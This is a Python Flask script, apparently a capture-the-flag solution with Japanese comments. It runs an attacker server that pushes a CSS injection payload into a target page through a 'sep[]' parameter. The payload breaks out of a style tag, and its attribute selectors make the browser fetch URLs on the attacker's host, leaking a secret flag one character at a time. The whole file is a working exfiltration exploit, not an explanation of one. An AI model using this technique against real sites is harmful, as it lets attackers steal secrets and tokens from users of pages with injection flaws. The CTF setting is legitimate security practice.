from flask import Flask, request, redirect
import urllib.parse
import sys
import os

app = Flask(__name__)

# ==========================================
MY_URL = "https://capture-the-f-l-a-g.onrender.com"
TARGET_URL = "http://web:3000"
# 必要最小限の文字セット（大文字が必要な場合は追加してください）
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}"
KNOWN_FLAG = "tkbctf{"
# ==========================================

@app.route('/start')
def start():
    global KNOWN_FLAG
    KNOWN_FLAG = "tkbctf{"
    print("[*] Attack Started! Resetting flag...", file=sys.stderr)
    
    html = """
    <!DOCTYPE html>
    <html>
    <body>
      <h1>Exploit Loading...</h1>
      <script>
        setTimeout(() => { window.location.href = '/next'; }, 500);
      </script>
    </body>
    </html>
    """
    return html

@app.route('/next')
def next_char():
    global KNOWN_FLAG
    if KNOWN_FLAG.endswith("}"):
        return f"<h1>Attack Finished!</h1><p>Flag: {KNOWN_FLAG}</p>"

    current_pos = len(KNOWN_FLAG)
    print(f"[*] Current Flag: {KNOWN_FLAG} (Length: {current_pos})", file=sys.stderr)

    # URLサイズの極小化（https: を削る）
    base_url = MY_URL.replace("https:", "").replace("http:", "") 
    css_rules = []

    for char in CHARSET:
        safe_char = urllib.parse.quote(char)
        # 極限までダイエットしたCSS（1ルール約80バイト）
        rule = f"a:nth-of-type({current_pos})[id='{char}']{{display:block;background:url({base_url}/l?c={safe_char}&p={current_pos})}}"
        css_rules.append(rule)

    css_payload = "".join(css_rules)

    # 間隔を1.0秒に設定（通信の安定性確保）
    sep0 = f'"></style><meta http-equiv="refresh" content="1.0;url={MY_URL}/next"><style>{css_payload}</style>'
    sep1 = '<a id="'

    params = urllib.parse.urlencode({'sep[]': [sep0, sep1]}, doseq=True)
    exploit_url = f"{TARGET_URL}/?{params}"
    
    # URLサイズを確認用に出力
    print(f"[*] Payload URL Length: {len(exploit_url)} bytes", file=sys.stderr)
    return redirect(exploit_url)

@app.route('/l')
def leak():
    global KNOWN_FLAG
    char = request.args.get('c')
    pos = request.args.get('p', type=int)

    if char and pos == len(KNOWN_FLAG):
        KNOWN_FLAG += char
        print(f"[+] Leaked! New Flag: {KNOWN_FLAG}", file=sys.stderr)

    transparent_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    return transparent_gif, 200, {'Content-Type': 'image/gif'}

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)